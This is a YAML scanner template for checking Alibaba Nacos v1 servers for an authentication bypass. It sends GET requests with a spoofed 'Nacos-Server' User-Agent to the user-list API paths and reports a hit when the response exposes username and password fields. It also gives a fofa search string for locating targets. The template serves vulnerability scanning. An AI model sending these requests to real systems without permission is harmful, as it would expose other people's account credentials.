expression: r0() || r1()
id: nacos-user-list-unauthorized
info:
  author: kmahyyg(https://github.com/kmahyyg)
  description: fofa app="NACOS"
  name: Alibaba Nacos V1 Auth Bypass
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.headers["content-type"].contains("application/json")
      && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
    request:
      headers:
        User-Agent: Nacos-Server
      method: GET
      path: /nacos/v1/auth/users?pageNo=1&pageSize=9
  r1:
    expression: response.status == 200 && response.headers["content-type"].contains("application/json")
      && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
    request:
      headers:
        User-Agent: Nacos-Server
      method: GET
      path: /v1/auth/users?pageNo=1&pageSize=9
